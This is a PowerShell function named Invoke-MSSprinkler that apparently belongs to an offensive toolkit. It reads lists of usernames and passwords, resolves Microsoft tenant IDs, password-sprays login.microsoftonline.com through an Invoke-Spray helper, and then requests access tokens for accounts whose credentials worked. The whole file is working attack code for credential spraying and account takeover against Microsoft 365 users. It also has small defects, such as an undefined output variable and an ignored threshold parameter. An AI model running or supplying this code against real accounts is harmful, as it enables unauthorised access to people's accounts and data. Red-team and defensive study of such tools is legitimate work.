function Invoke-MSSprinkler{
    param(
        [string]$user,
        [string]$pass,
        [string]$threshold = 8,
        [string]$url = 'https://login.microsoftonline.com',
        [string]$output = "results.csv"
    )

    # Define the path to the module folder (adjust this to the correct path)
    $modulePath = ".\PowerShellModules\PowerShellModule.psm1"

    # Import the module using the full path
    Import-Module -Name $modulePath -Force

    # Path to the input file with a list of emails
  #  $user = "userlist.txt"
  #  $pass = "pass.txt"
    $outputFile = "results.csv"

    # Read the list of users (emails)
    $usernames = Get-Content $user
    $passwords = Get-Content $pass
    $clientId = '5aa316d3-d05a-485f-a849-e05182f87d1d'

    # Define the folder and file paths
    $folderPath = ".\jsonModules"
    $domainCacheFile = "domainCache.json"
    $tokenCacheFile = "tokenCache.json"
    $domainFullFilePath = Join-Path -Path $folderPath -ChildPath $domainCacheFile
    $tokenFullFilePath = Join-Path -Path $folderPath -ChildPath $tokenCacheFile

    # Initialize domain & tenant cache
    $domainCache = @{ }
    $tenantCacheResult = Get-TenantId -users $usernames

    $validUsersFilePath = "validated_users.txt"
    $validUsers = Get-Content $validUsersFilePath

    # Ensure the jsonModules directory exists
    if (-not (Test-Path -Path $folderPath))
    {
        New-Item -ItemType Directory -Path $folderPath -Force
        Write-Host "Directory created: $folderPath"
    }
    else
    {
        Write-Host "Directory exists: $folderPath"
    }

    if (-not (Test-Path -Path $domainFullFilePath))
    {
        '{}' | Out-File -FilePath $domainFullFilePath
        Write-Host "Created new domainCache.json file at $domainFullFilePath"
    }

    if (-not (Test-Path -Path $tokenFullFilePath))
    {
        '{}' | Out-File -FilePath $tokenFullFilePath
        Write-Host "Created new tokenCache.json file at $tokenFullFilePath"
    }

    # Save the domain cache result to the file in the specified folder
    $tenantCacheResult | ConvertTo-Json -Depth 10 | Out-File -FilePath $domainFullFilePath
    Write-Host "Tenant information cached to $domainFullFilePath."

    # Call the Invoke-Spray function
    $sprayResult = Invoke-Spray -user $validUsersFilePath -pass $pass -threshold 30 -url 'https://login.microsoftonline.com' -output $outputs

    # Load the JSON files and convert them to PowerShell objects
    $tokenCacheContent = Get-Content -Path $tokenFullFilePath | ConvertFrom-Json
    $domainCacheContent = Get-Content -Path $domainFullFilePath | ConvertFrom-Json

    if (Test-Path $domainFullFilePath)
    {
        $domainCache = Get-Content -Path $domainFullFilePath | ConvertFrom-Json
    }
    else
    {
        Write-Warning "Domain cache file does not exist at $domainFullFilePath."
    }


    # Iterate through each key-value pair in the token cache
    foreach ($userKey in $tokenCacheContent.PSObject.Properties.Name)
    {
        if ($userKey -match '@(.+)$')
        {
            $domain = $matches[1]  # Extract domain part after @
            $passValue = $tokenCacheContent.$userKey.password
            # Iterate through the keys of the domain cache
            foreach ($domainKey in $domainCacheContent.PSObject.Properties.Name)
            {
                if ($domain -eq $domainKey)
                {
                    $tenantId = $domainCacheContent.$domainKey."tenant id"
                    Get-UserToken -tenantId $tenantId -clientId $clientId -user $userKey -pass $passValue
                }
            }
        }
    }
}